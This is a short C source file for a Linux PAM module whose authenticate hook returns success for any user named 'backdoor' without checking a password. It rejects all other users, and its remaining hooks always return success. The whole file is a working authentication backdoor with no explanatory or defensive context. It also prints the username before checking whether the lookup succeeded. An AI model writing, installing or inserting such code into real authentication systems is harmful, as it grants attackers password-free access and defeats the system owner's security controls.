#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PAM hook: allows modifying the user's credentials */
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	// We don't need to modify credentials, so just return success
	return PAM_SUCCESS;
}

/* PAM hook: determine if this account can be used at the moment. The main action of this module */
PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	int retval;

	const char *pUsername;
	retval = pam_get_user(pamh, &pUsername, NULL);

	printf("Acct mgmt for %s\n", pUsername);
	return PAM_SUCCESS;
}

/* expected hook, this is where custom stuff happens */
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	int retval;

	const char *pUsername;
	retval = pam_get_user(pamh, &pUsername, "Username: ");

	printf("Welcome %s\n", pUsername);

	if (retval != PAM_SUCCESS) {
		return retval;
	}

	if (strcmp(pUsername, "backdoor") != 0) {
		return PAM_AUTH_ERR;
	}

	return PAM_SUCCESS;
}
